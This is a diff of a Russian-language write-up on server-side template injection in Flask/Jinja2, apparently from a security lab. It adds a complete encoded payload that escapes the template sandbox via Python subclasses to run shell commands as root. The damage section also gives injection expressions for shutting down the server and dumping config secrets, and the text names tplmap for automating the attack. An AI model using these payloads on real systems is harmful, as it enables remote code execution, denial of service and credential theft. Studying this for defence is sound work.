@@ -50,8 +50,29 @@
   
   ![secret](https://pp.userapi.com/c849132/v849132517/112eed/sPWNeku-cVI.jpg)
   #### Исполнение любых команд на сервере (с правами суперпользователя)
-  Проверим выполнение последосвательности команд `id`;`ls`;`echo "im knockie, im winner!" >> hacked.txt`; `cat hacked.txt`, закодировав их в base64 и urlencode.
-  ![cmd2](https://pp.userapi.com/c849132/v849132517/112f04/TbdIfSu1PAg.jpg)
+  Проверим выполнение последосвательности команд, закодировав их в base64 и urlencode.  
+  #### Полностью запрос выглядит так:
+  
+  ```python
+ %7B%7B6795544878%7D%7D%7B%7B%27%27%7D%7D%7B%25+set+d+%3D+%22eval%28__import__%28%27base64%27%29.urlsafe_b64decode%28%27X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnYVdRN2JITTdaV05vYnlBaWFXMGdhMjV2WTJ0cFpTd2dhVzBnZDJsdWJtVnlJU0lnUGo0Z2FHRmphMlZrTG5SNGREc2dZMkYwSUdoaFkydGxaQzUwZUhRPScpLmRlY29kZSgpKS5yZWFkKCk%3D%3D%27%29%29%22+%25%7D%7B%25+for+c+in+%5B%5D.__class__.__base__.__subclasses__%28%29+%25%7D+%7B%25+if+c.__name__+%3D%3D+%27catch_warnings%27+%25%7D%0A%7B%25+for+b+in+c.__init__.__globals__.values%28%29+%25%7D+%7B%25+if+b.__class__+%3D%3D+%7B%7D.__class__+%25%7D%0A%7B%25+if+%27eval%27+in+b.keys%28%29+%25%7D%0A%7B%7B+b%5B%27eval%27%5D%28d%29+%7D%7D%0A%7B%25+endif+%25%7D+%7B%25+endif+%25%7D+%7B%25+endfor+%25%7D%0A%7B%25+endif+%25%7D+%7B%25+endfor+%25%7D%7B%7B%27%27%7D%7D%7B%7B3601511735%7D%7D
+ ```
+ #### urldecode:
+```python
+{{6795544878}}{{''}}{% set d = "eval(__import__('base64').urlsafe_b64decode('X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnYVdRN2JITTdaV05vYnlBaWFXMGdhMjV2WTJ0cFpTd2dhVzBnZDJsdWJtVnlJU0lnUGo0Z2FHRmphMlZrTG5SNGREc2dZMkYwSUdoaFkydGxaQzUwZUhRPScpLmRlY29kZSgpKS5yZWFkKCk='))" %}{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %}
+{% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %}
+{% if 'eval' in b.keys() %}
+{{ b['eval'](d) }}
+{% endif %} {% endif %} {% endfor %}
+{% endif %} {% endfor %}{{''}}{{3601511735}}
+```
+#### base64decode (открытие шелла):
+```python
+__import__('os').popen(__import__('base64').urlsafe_b64decode('aWQ7bHM7ZWNobyAiaW0ga25vY2tpZSwgaW0gd2lubmVyISIgPj4gaGFja2VkLnR4dDsgY2F0IGhhY2tlZC50eHQ=').decode()).read()
+```
+#### base64decode (передача последовательности необходимых команд):
+```python
+id;ls;echo "im knockie, im winner!" >> hacked.txt; cat hacked.txt
+```
   Результат запроса:
   ![cmd](https://pp.userapi.com/c849132/v849132517/112efd/tuUyVE4ZbU0.jpg)
   Однако, данные действия возможно автоматизировать, используя консольную утилиту `tplmap`:
@@ -62,14 +83,14 @@
   [Tplmap.](https://github.com/epinna/tplmap)
   
   ## Ущерб
-1) Анализ объекта request, который является глобальным в фрейворке Flask (flask.request). Данный объект содержит ту же самую информацию, что и объект request, доступный через представление. Внутри объекта request находится объект environ. Объект request.environ представляет собой словарь объектов, имеющих отношение к серверной части. Один из элементов этого словаря – метод shutdown_server, который связан с ключом werkzeug.server.shutdown. В шаблон можно инжектировать выражение {{ request.environ['werkzeug.server.shutdown']() }} и спровоцировать DOS-атаку. Однако этот метод не доступен, если приложение запущено при помощи HTTP-сервера gunicorn. Так что уязвимость может присутствовать лишь на сервере, который используется в целях разработки.
+* 1) Анализ объекта request, который является глобальным в фрейворке Flask (flask.request). Данный объект содержит ту же самую информацию, что и объект request, доступный через представление. Внутри объекта request находится объект environ. Объект request.environ представляет собой словарь объектов, имеющих отношение к серверной части. Один из элементов этого словаря – метод shutdown_server, который связан с ключом werkzeug.server.shutdown. В шаблон можно инжектировать выражение `{{ request.environ['werkzeug.server.shutdown']() }}` и спровоцировать DOS-атаку. Однако этот метод не доступен, если приложение запущено при помощи HTTP-сервера gunicorn. Так что уязвимость может присутствовать лишь на сервере, который используется в целях разработки.
 
-2) Анализ объекта config, который, так же как и объект request, является глобальным в фреймворке Flask (flask.config). Данный объект представляет собой словарь со всеми переменными, связанными с конфигурацией приложения, в том числе строками для подключения к базе данных, учетными записями к сторонним сервисам, SECRET_KEY и т. д. Просмотр этих переменных осуществляется при помощи выражения {{ config.items() }} и не сложнее, чем инжектирование полезной нагрузки. Не спасает и хранение этих данных в переменных среды окружения, поскольку объект config содержит все переменные, связанные с конфигурацией, ПОСЛЕ обработки фреймворком. Помимо того что config представляет собой словарь, этот объект также является подклассом, содержащим несколько методов: from_envvar, from_object, from_pyfile и root_path.
+* 2) Анализ объекта config, который, так же как и объект request, является глобальным в фреймворке Flask (`flask.config`). Данный объект представляет собой словарь со всеми переменными, связанными с конфигурацией приложения, в том числе строками для подключения к базе данных, учетными записями к сторонним сервисам, SECRET_KEY и т. д. Просмотр этих переменных осуществляется при помощи выражения `{{ config.items() }}` и не сложнее, чем инжектирование полезной нагрузки. Не спасает и хранение этих данных в переменных среды окружения, поскольку объект config содержит все переменные, связанные с конфигурацией, ПОСЛЕ обработки фреймворком. Помимо того что `config` представляет собой словарь, этот объект также является подклассом, содержащим несколько методов: `from_envvar`, `from_object`, `from_pyfile` и `root_path`.
 
-3) Возможны:
-- XSS(cross-site scripting)
-- чтение файлов с системы
-- достижение RCE(remote code execution)
+* 3) Возможны:
+- XSS (cross-site scripting)
+- чтение файлов системы
+- достижение RCE (remote code execution)
   
   ## Защита(?)
   ### Основные меры
@@ -84,13 +105,4 @@
   Проверка работоспособности через tplmap:  
   
   ![tplm](https://pp.userapi.com/c849132/v849132289/1166c6/oNOZ7f7LDN8.jpg)  
-  
-  ### Превентивные меры(?)
-  Фильтрация пользовательского ввода.
-  
-  
-  ## Обход защиты(?)
-  Если существуют варианты обхода защиты, то можно их здесь перечислить.
-  
-  Если есть возможность, то надо написать в чем заключается защита и каким образом она обходится.
   
